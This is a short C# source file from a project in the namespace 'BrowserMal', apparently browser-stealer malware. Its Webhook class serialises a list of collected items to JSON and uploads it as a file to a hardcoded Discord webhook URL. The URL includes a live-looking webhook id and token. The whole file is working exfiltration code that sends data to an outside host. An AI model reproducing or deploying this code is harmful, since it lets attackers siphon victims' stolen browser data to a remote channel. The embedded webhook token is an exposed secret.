using Newtonsoft.Json;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace BrowserMal.Discord
{
    internal class Webhook
    {
        public static void SendFile<T>(List<T> list, string filename)
        {
            string url = "https://discord.com/api/webhooks/1010678372852039820/UORZl9tQWUFJoR13s7Gog_Kh3nbMK-BwVwWU6dgDHVVmIiVJhH_f3HIIIS3REDTAZUEj";

            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                string json = JsonConvert.SerializeObject(list, Formatting.Indented);

                var file_bytes = Encoding.UTF8.GetBytes(json);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", filename);

                httpClient.PostAsync(url, form).Wait();
                httpClient.Dispose();
            }
        }
    }
}
